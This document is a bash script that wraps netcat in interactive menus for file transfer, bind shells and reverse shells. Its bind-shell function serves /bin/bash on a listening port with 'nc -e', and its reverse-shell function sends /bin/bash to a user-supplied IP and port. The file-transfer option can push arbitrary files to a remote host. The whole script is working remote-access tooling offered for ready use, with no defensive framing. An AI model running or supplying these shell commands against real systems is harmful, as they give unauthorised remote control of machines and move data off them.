#!/bin/bash
#CREATOR: m3thodman, Alexander Lopez
#Purpose: Streamline Netcat Functions - File Transfers, Bind Shell, Reverse Bind Shell
#Benefit: Saves Users The Hassle of Memorizing Commands

#WARNING
#Best Results: Run as Sudo (Admin Priv.)

#************************Functions****************************************
function L/R() #Funtion to Determine Whether User is Setting Up a Listener or Connecting to Port
{
	LR=0
	while [[ $LR -gt 2 || $LR -lt 1 ]]
	do
		echo -e "OPTIONS:\n[1]Set Up a Listener\n[2]Connect to a Port"
		read LR #Stores Listen or Receive Value
	done

	echo "Enter Port: "
	read PORT

	if [ $LR -eq 2 ]
	then
		echo "Enter IP of Port (connecting to): "
		read IP #Stores IP Address to Listener
	fi	
}

function FileTransfer() #Function to Transfer a File
{
	SR=0
	while [[ $SR -gt 2 || $SR -lt 1 ]]
	do	
		echo -e "OPTIONS:\n[1]Send a File\n[2]Receive a File"
		read SR #Stores Send or Receive Value
	done

	if [ $SR -eq 1 ]  
	then
		echo "Enter Name of File to Send: "
		read SENDFILENAME
		if [ $LR -eq 1 ] #Set Up Listener and Send File
		then
			echo "Setting Up Listener and Sending $SENDFILENAME"
			nc -nlvp $PORT < $SENDFILENAME
		elif [ $LR -eq 2 ]
		then #Connect to Another User's Listener and Send File
			echo "Connecting to $IP at Port $PORT and Sending $SENDFILENAME"
			nc -nv $IP $PORT < $SENDFILENAME 
		fi
	elif [ $SR -eq 2 ]
	then
		echo "Name the File (to receieve): "
		read RECFILENAME
		if [ $LR -eq 1 ]
		then
			echo "Setting Up Listener to Receive File: "
			nc -nlvp $PORT > $RECFILENAME
		elif [ $LR -eq 2 ]
		then	
			echo "Connecting to $IP at Port $PORT and Receiving $RECFILENAME"
			nc -nv $IP $PORT > $RECFILENAME
		fi	

	fi	
}	


function BindShell
{
	if [ $LR -eq 1 ]
	then
		echo "Setting Up a Listener to Create Bind Shell"
		nc -nlvp $PORT -e /bin/bash
	elif [ $LR -eq 2 ]
	then	
		echo "Connecting to $IP at Port $PORT to Receive Bind Shell"
		nc -nv $IP $PORT
	fi

}	

function ReverseBindShell
{
	if [ $LR -eq 1  ]
	then
		echo "Setting up a Listener to Configure Reverse Bind Shell"
		nc -nlvp $PORT
	elif [ $LR -eq 2 ]
	then
		echo "Connecting to $IP at Port $PORT to Send Shell"
		nc -nv $IP $PORT -e /bin/bash
	fi	
}	

#************************Start of Script***********************************
OPTION=0

while [[ $OPTION -gt 3 || $OPTION -lt 1 ]]
do
	echo -e "OPTIONS:\n[1]File Transfer\n[2]Bind Shell\n[3]Reverse Bind Shell"
	read OPTION	
done	

case $OPTION in 
	1) 
		echo "**************************************************************"
		echo "FILE TRANSFER"
		L/R
		FileTransfer
		;;
	2)
		echo "**************************************************************"
		echo "BIND SHELL"
		L/R
		BindShell
		;;
	3)
			
		echo "**************************************************************"
		echo "REVERSE BIND SHELL"
		L/R
		ReverseBindShell
		;;
esac	
		
